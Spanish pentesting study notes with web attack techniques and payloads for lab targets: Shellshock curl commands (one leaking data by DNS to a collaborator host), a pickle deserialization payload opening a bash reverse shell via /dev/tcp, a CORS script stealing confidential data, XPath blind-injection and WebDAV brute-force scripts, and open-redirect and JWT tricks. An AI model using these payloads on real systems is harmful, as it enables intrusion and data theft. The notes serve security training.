- Fuzeamos el directorio
```bash
wfuzz -c --hw=116 --hc=400,404  -w /home/kuser/cosas/repositorios/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  http://192.168.1.135:9001/upload41/FUZZ/exploitcmd.php
```
12. Subimos nuestro payload con el nombre **exploitCMD.jpg.php**
- El backend sólo verifica que esté la cadena **.jpg**
12. Subimos archivo y no nos deja visitarlo porque te lo descarga
- Desde Burp también vale
```bash
curl -s -X GET "http://localhost:puerto/upload/archivo.php" -G --data-urlencode "cmd=cat /etc/passwd"
```

## Prototype Pollution

>Si una variable n o posee una propiedad, busca el objeto **__proto__** del que heredará la propiedad
>Debemos intentar colar ese **__proto__** en una entrada de datos

- Cambiar entrada de datos a JSON
`email=test@test.com&mssg=loque sea primazo`

```BurpSuite
Content-Type: application/json

{
	"email":"test@test.com",
	"msg":"loque sea primazo"
	"__proto__":{
	"isadmin":true # el campo "isAdmin" lo podemos bruteforcear con una wde Seclist 😁
	}
}
```

## Transferencia de Zona Attacks - # (AXFR – Full Zone Transfer)

>Obtenemos info sobre domains Servers, asociados a ese dominio o intentamos copiar la BD

> Útil para ahorrarse la Fuerza Bruta


- **AXFR- Transferencia de zona**

```bash
dig ns @ipTarget dominioTarget
dig mx @ipTarget dominioTarget
dig hinfo @ipTarget dominioTarget
dig axfr @ipTarget dominioTarget
```

- **IXFR - Transferencia de zona Incrementales**

> Filtran info sólo desde la última actualización

```bash
dig ixfr @ipTarget dominioTarget
```

## Ataques de asignación masiva (Mass-Asignment Attack) / Parameter Binding

>Enviamos solicitudes HTTP para modificar campos que no deberían ser accesiibles,**NO AGREGAR PARÁMETROS**

>En el response nos viene un parámetro de verificación que no hemos enviado, así que ese  mismo se lo podemos poner 

>En el archivo donde está el ódigo que controla esto es un **.controller**

```BurpSuite
{ "isadmin": true}
```

>Podemos añadirle el mimso param **Intentar en el formato que sea**

```BurpSuite
&user[username]=Gest&user[is_admin]=true&....  # Bruteforcear ese "is_admin" hombre
```

## Open Redirect

>Tools : [Ufonet](https://github.com/epsylon/ufonet)

>Sites uso de **Ufonet** [Apuntes J0m0z4](file:///Z:/Estudios/HackingEtico/J0m0z4RedTeamRedes/1Trim/Apuntes/Apuntes3.pdf)

>Permite a base de **Google Dorks** detectar que servidores son vulnerables a Open redirect y a través de esos servidores mandar peticiones DNS a una máquina víctima ocasionando un **DDOS**, atacando a la **capa 7** abusando de la **capa 3**

>Labs a jugar:  [OpenRedirect1](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Url-redirection)

```URL
http://192.168.1.135:5000/redirect?newurl=https://evil.com
```

>Labs a jugar 2 :  [OpenRedirect2](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Url-redirection-harder)

- Lo que hacemos es encodear el . y luego encodear el porcentaje de ese encodeo
- . **URL ENCODE** --> %2e
- % **URL ENCODE** --> %252e
```URL
http://192.168.1.135:5000/redirect?newurl=https://evil%252ecom
```

>Labs a jugar:  [OpenRedirect3](https://github.com/blabla1337/skf-labs/tree/master/nodeJs/Url-redirection-harder2)

- Misma técnica que la anterior pero quitándole **//**

```URL
http://192.168.1.135:5000/redirect?newurl=https:evil%252ecom
```

>Es una técnica potencial para realizar phishings enviándole el link de 

`https://legitcompany.es/redirect=https://VPSphishing.com`

## Enumeración y explotación de WebDAV

>Tools: 
>1. **davtest**
>2. **cadaver**

- davtest --> Prueba a subir muchos archivos maliciosos
```bash
davtest -utl http://localhost -auth admin:admin 2>&1
```

- Oneliner **BruteForce** a webdav
```bash
cat wordlist | while read password; do response=$(davtest -url http://targetIP -auth admin:$password 2>&1 | grep -i succeed); if [ $response ]; then echo "[+
] La contraseña correcta es $password"; break; fi; done
```

- cadaver
```bash
cadaver http://iptarget # Dar credenciales válidas
```

> Posibles subidas

```bash
mkdir uploading
cd uploading
nano cmdexploit.php
#Después de esto Visitamos la URL como en file upload con objetivo de revShell
```

## Squid Proxies

>**Licencia GPL**: Licencia que otorga la libertad a los usuarios de utilizar, compartit, modificar y estudiar el software

> Servidor web proxy-caché con licencia GPL, que está entre el usuario y la siguuiente red par aañadir una capa de protección o actuándo de caché para la latencia o restringir determinadas páginas
> Sólo el Proxy debe disponer d econexión ainternet y el reto de equipos salen a través de él

> Tools: [Spose](https://github.com/aancw/spose)
> Lab para jugar: [SicKos](https://www.vulnhub.com/entry/sickos-11,132/)

- Detección con nmpa -sVC
```bash
curl http://Targetip --proxy http://targetip:3128 # puerto que me chivaba nmap
curl http://127.0.0.1:22 --proxy http://targetip:3128 # puerto que me chivaba nmap #Vemos la repsuesta del puerto 22 del proxy, NO de localhost
```

- Pasamos por foxy proxy y damos de alta un proxy con **TArgetIP**, **SquidPort**
- Fuzzeamos con gobuster --proxy http://targetip:3128 
- Automatizamos con python el escaneo de puertos a través del squid
```python
signal.signal(signal.SIGINT, def_handler)

main_url = "http://127.0.0.1"
squid_proxy = {'http': 'http://192.168.111.39:3128'}

def portDiscovery( ):

	common_tcp_ports = {20, 21, 22, 23, 25, 53, 67, 68, 69, 80, 88, 110, 119, 123, 135, 137, 138, 139, 143, 161, 162, 179, 389, 443, 445, 465, 514, 515, 587, 636, 993, 995, 1080, 1433, 1434, 1723, 3306, 3389, 5060, 5222, 5223, 5900, 5901, 5984, 6379, 8080, 8443, 8888, 9200, 9300, 11211, 27017}

	for tcp_port in common_tcp_ports:
		r = requests.get(main_url + ':' + str(tcp_port), proxies=squid_proxy)
		if r.status_code != 503:
			print("\n[+] Port " + str(tcp_port) + " - OPEN")

if __name__ = '__main__':

	portDiscovery( )
```

>Después de reconocer puertos
- Aunque también podemos hacer un **proxychains4 nmap** , SI PREVIAMENTE DAMOS DE **ALTA ESTE PPROXY EN proxychains4.conf**
```bash
curl http://127.0.0.1:3306 --proxy http://targetip:3128 --output salida
/bin/cat output # vemos info
```

## Shellshock

> Atentos al archivo **/cgi-bin** en un fuzzing, fuzzear después de /cgi/bin también y la versión **bash** debe ser antigua
> El server a atacar debe procesar las peticones en **BASH**

- Esto e suna función vacía y según tu versión bash no es capaz d ecerrar la función antes de definirse
```bash
 () { :; }; 
```
- Para ejecución de comandos poner ruta absoluta y jugar con los **echo;**
```bash
curl -s -H "user-agent: () { :; };  echo; /bin/bash -c 'cat /etc/passwd'" http://localhost:8080/cgi-bin/vulnerable.sh
curl -s -H "user-agent: User-Agent: () { :; }; /usr/bin/nslookup $(ls).$(echo "<>").collaborator.com" http://localhost:8080/cgi-bin/vulnerable
```

## XPATH

>Zona de Juegos: [Vulhub](https://www.vulnhub.com/entry/xtreme-vulnerable-web-application-xvwa-1,209/)

>¿Cómo sé que debo probar XPATH?
>Tiene debajo una estructura XML  las consultas son ligeramente diferentes

- [XPATHPayloadsallThethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md)
- [XPATHHACKTRICKS](https://book.hacktricks.wiki/en/pentesting-web/xpath-injection.html)

- Al igual que SQLI debemos saber cuántas etiquetas=columnas tiene, pero no nos mostraá información, es based boolean, simplemente en el response nos sacará un texto si es verdadera la consulta que le damos

- Eso significa que de la primera etiqueta nos de la primera entidad y el primer caracter es la letra "x"
```BurpSuite
search=1' and name(/*[1]/*[1]),1,1)='x&submit=yes
```

- También hay que jugar con **substring, count,name **

```python
#!/usr/bin/python3

from pwn import *
import requests
import time
import sys
import string
import signal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo ... \n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://192.168.111.41/xvwa/vulnerabilities/xpath/"
characters = string.ascii_letters + string.digits + string.punctuation  # Asegurarse de incluir caracteres válidos.

def xPathInjection():
    data = ""  # Se inicializa correctamente la variable.

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Data")

    for first_position in range(1, 51):
        for character in characters:

            post_data = {
                'search': "1' and substring(Secret,%d,1)='%s" % (first_position, character),
                'submit': 'Submit'
            }

            r = requests.post(main_url, data=post_data)

            if len(r.text) != 8676 and len(r.text) != 8677:
                data += character
                p2.status(data)
                break

    p1.success("Ataque de fuerza bruta concluido")
    p2.success(data)

if __name__ == "__main__":
    xPathInjection()
```

## IDOR - Insecure Direct Object Reference

>Pues  simplemente cambiamos el number de la url
>A parte de fuzzear el rago con **Burp**, lo haremos con wfuzz también

```bash
# POST
wfuzz -c --hc=404,400,403 -z range,1-2000 'https://valvonta.es/product_id=FUZZ

# GET
wfuzz -c -X POST --hc=404,400,403 -z range,1-2000 -d 'product_id=FUZZ' https://valvonta.es/
```

## CORS

>Si envenenamos la cabecera **Origin:** la víctima que viste el sitio será sometida a lo que permita la web traer de dominios terceros

- Las líneas **4 y 5** dicen que las credenciales entre sitios pueden viajar
```Response-HTTP
1 HTTP/1.0 200 OK
2 Content-Type: text/html; charset=utf-8
3 Content-Length: 10293
4 Access-Control-Allow-Credentials: true
5 Access-Control-Allow-Origin: https://test.com
6 Vary: Origin, Cookie
7 Server: Werkzeug/0.14.1 Python/3.6.9
8 Date: Thu, 02 Mar 2023 12:10:07 GMT
```
- Examples
```Burpsuite
Origin: http://eploit.server
Origin: null
Origin: **
```

- Contenido de **/tumadre.js**
```JS
<script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('GET', 'http://localhost:5000/confidential', true);
 req.withCredentials = true;
 req.send();

 function reqListener() {
        document.getElementById("stolenInfo").innerHTML = req.responseText;
 }
</script>

<br>
<center><h1>Has sido hackeado, esta es la información que te he robado:</h1></center>
<p id="stolenInfo"></p>
```


- Si quiere pintarlo bonito sólo tienes que esperar a que  lleguen  peticiones de la víctima con sus directorios y archivos y copiarlos todos con el mimso nombre aunque no tengan contenido

## SQL Truncation

-----
>Lab Para Jugar: [Lab](https://www.vulnhub.com/entry/ia-tornado,639/)
-----

>En este ataque lo que hace la base de datos por detrás  en **/resgister-user** es borrar los espacios que pones en el username de un login y hacer la comprobación si el usuario existe, cabe destcar que estos logins tienen un **límite max-length** y nosotros lo excedermos con los espacios

>Aunque de primeras como el usuario `user@user.com    aaa` no existe, le cambias la contraseña al usuario  user@user.com


```LoginPanel
# En el HTML modificar el max-length
Login: user@user.com    aaa
Password: telacambioprimo
```

Podemos poner **~**  al directorio de un usuario para ver si tiene un alias asignado en el backend

```URL
http://dominacoprimo.com/~usuario/
```

## Session Puzzling / Session Fixation / Session Variable Overloading

>Una web en el **/forgot-password** te puede setear previamente una cookie y sin  estar autenticado puedes ver directorios que no deberías, **TENEMOS QUE PONER UN USER válido**

### Session Fixation
-  Le podemos pasar a una víctima una url con el valor de una cookie por GET y si está mal desarrolladola víctima la web le asignará esa cookie.
`http://dominiochi.com/?Setcookie=123456asf`

- Esto sirve para hacernos pasar por la víctima
### Session Puzzling

>Se refiere a hacer fuerza bruta en una cookie para intentar validarse como otro user

### Session Variable Overloading

> se refiere a un tipo específico de ataque de Session Fixation en el que el atacante envía una gran cantidad de datos a la aplicación web con el objetivo de sobrecargar las variables de sesión.

## JWT

- Pasar el algoritmo a "none" y quitarle la signature, ir cambiando el id para suplantar un user
- Creamos nuestro  jwt a partir del jwt que nos da la web fijándonos en su estructura
```bash
echo -n '{"alg":"cadenadeJWT"}' | base64
```

- Podemos no cambiarle nada y jugar a averiguar el secreto, ir cambiando el id para suplantar un user
## Race Condition

>En este caso el backend posee una inyección de comandos, pero si en el parámetro de entrada le pones algo que no sea alfanumérico como \`id\`  borrará el fichero donde se redirigía el output de ese comando

>En este periodo nos daría tiempo a leer el archivo

>El secreto es la rapidez de peticiones y que de 2 peticione sa la vez el server le envíe el 
>response a quién no debe

- Lanzo el comando **id** en un bucle
```bash
while true; do curl -s X GET 'http://localhost:5000/?person=`id`&person=validate'; done
```

- Hago peticiones hasta que salga el comando
```bash
while true; do curl -s X GET 'http://localhost:5000/?action=run' | grep "Check this out" | html2text | xargs | grep -vE "cadenas| quenoquiera| En el Response"; done
heck this out: uid=0(root) gid=0(root) grupos=0(root)
```

## CSSI - Inyecciones CSS

>Si hay un parámetro que te cambia el color o forma del output, podemos enchufarle esto

`color=beige}</laetiquetaquehayaquecerrar><script>alert("XSS")</script>`

## Python Deserialization Yaml

>**YAML:** formato de deserializacion de datos legible inspirado en formatos de correo.

- [Sitio de payloads](https://www.pkmurphy.com.au/isityaml/)

- SI vemos una cadena en **Base64 en la URL o en cualquier sitio**, la sustituimos por la que nos da abajo
```bash
echo -n "YAML: !!python/object/apply:subprocess.check_output ['ls']" | base64 -w 0 ; echo
```

## Python - Deserialization Pickle Library

>Representa objetos de python en una cadena de bytes

Según lo que el backend pida, en este caso parte de que la cadena debe ser hexadecimal para que por detrás lo encodee, pegaremos en la web lo que nos dé este output

```python
import pickle
import os
import binascii

class Exploit(object):
	def _reduce_(self):
		return (os.system, ('bash -c "bash -i >& /dev/tcp/192.168.111.45/443 0>&1"',))

if __name__ == '__main__':
	print(binascii.hexlify(pickle.dumps(Exploit()))
```

## GraphQL , Introspection, mutation, IDOR

>**GraphQL:** Lenguaje de consulta en tiempo de ejecución para las API

### Introspection

>Cuando haya introspección se lo podemos mandar al **repeater** en burp o podemos consultar [HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html) y pegar en la url una de sus consultas

>Si hay respuesta copiamos la respuesta en [Vayaguer](https://graphql-kit.com/graphql-voyager/) y la pegamos o la mandamos a  la extensión GraphQL en **BurpSuite**

### Mutation

>Podemos cambiar valores como si de un IDOR se tratase, para impersonar a alguien a diferencia de las consultas las mutaciones permiten modificar datos

